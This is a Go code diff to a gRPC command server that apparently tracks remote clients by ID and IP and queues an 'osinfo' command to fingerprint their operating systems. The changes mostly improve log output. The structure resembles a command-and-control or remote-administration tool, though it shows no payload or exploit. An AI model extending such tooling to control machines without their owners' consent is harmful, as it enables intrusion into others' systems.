@@ -39,10 +39,8 @@ var Command = map[string]string{}
 
 func (s server) HandleCommands(srv pb.Com_HandleCommandsServer) error {
 
-	log.Println("Server Started")
-
 	ctx := srv.Context()
-
+	log.Printf("Client connected")
 	for {
 
 		// exit if context is done
@@ -108,7 +106,17 @@ func (s server) HandleCommands(srv pb.Com_HandleCommandsServer) error {
 					log.Fatalf("%v", err)
 				}
 
-				log.Printf("%v", osinfo)
+				log.Println("-------------------")
+				log.Printf("OSINFO - Client ID %s\n", req.ClientID)
+				log.Println("-------------------")
+				log.Println("Family: " + osinfo.Family)
+				log.Println("Architecture: " + osinfo.Architecture)
+				log.Println("ID: " + osinfo.ID)
+				log.Println("Name: " + osinfo.Name)
+				log.Println("Codename: " + osinfo.Codename)
+				log.Println("Version: " + osinfo.Version)
+				log.Println("Build: " + osinfo.Build)
+				log.Println("-------------------")
 
 			}
 		default:
@@ -159,7 +167,12 @@ func (cli *CommandLine) validateArgs(data []string) {
 }
 
 func (cli *CommandLine) getClients() {
-	log.Printf("%v", Clients)
+	for k := range Clients {
+
+		now := time.Now()
+		lastContact := now.Sub(Clients[k].LastPing)
+		log.Printf("Client ID: %s - IP: %s - Last Contact: %s ago", k, Clients[k].ClientIP, lastContact)
+	}
 }
 
 func (cli *CommandLine) Run() {
@@ -200,7 +213,13 @@ func (cli *CommandLine) Run() {
 			if *clientosinfo == "" {
 				osinfo.Usage()
 			} else {
-				Command[*clientosinfo] = "osinfo"
+				if Command[*clientosinfo] == "osinfo" {
+					log.Println("WARING: osinfo request already sent to client... Please wait a response!")
+				} else {
+					log.Println("INFO: osinfo request sent to client... Please wait a response!")
+					Command[*clientosinfo] = "osinfo"
+				}
+
 			}
 
 		}
